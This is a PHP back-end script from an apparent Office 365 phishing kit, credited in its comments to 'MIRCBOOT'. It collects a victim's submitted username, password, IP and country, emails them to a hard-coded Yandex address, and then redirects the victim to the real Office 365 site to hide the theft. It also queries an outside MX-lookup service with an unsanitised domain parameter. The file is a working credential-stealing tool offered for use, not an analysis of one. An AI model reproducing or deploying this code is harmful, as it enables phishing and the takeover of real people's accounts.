<?php
header("Access-Control-Allow-Origin: *");

// THIS SCRIPT CODED BY MIRCBOOT
// CONTACT US SKYPE : MIRCBOOT
// ICQ : 703514486
// Genral 365 Version 14
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
$recipient = 'movictrujuk@yandex.com'; // Put your email address here
$finish_url = 'https://office365.com';


// Send Email
if(isset($_POST['user']) && isset($_POST['pass']))
{
	$user = $_POST['user'];
	$pass = $_POST['pass'];
	$ip = $_POST['ip'];
	$country = $_POST['country'];
	$useragent = $_SERVER['HTTP_USER_AGENT'];

	$message = "-----------------+ True Login Verfied  +-----------------\n";
	$message.= "User ID: " . $user . "\n";
	$message.= "Password: " . $pass . "\n";
	$message.= "Client IP      : " . $ip . "\n";
	$message.= "Client Country      : " . $country . "\n";
	$message.= "-----------------+ Created in MIRCBOOT+------------------\n";
	$subject = "Aloma OFFICE 365 | True Login: " . $ip . "\n";
	mail($recipient, $subject, $message);
	echo $finish_url;
}

if(isset($_GET['domain']))
{
	$domain = $_GET['domain'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://mx-api.com/mx/mx.api?domain=$domain");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	echo $mx = curl_exec($ch);
}



?>
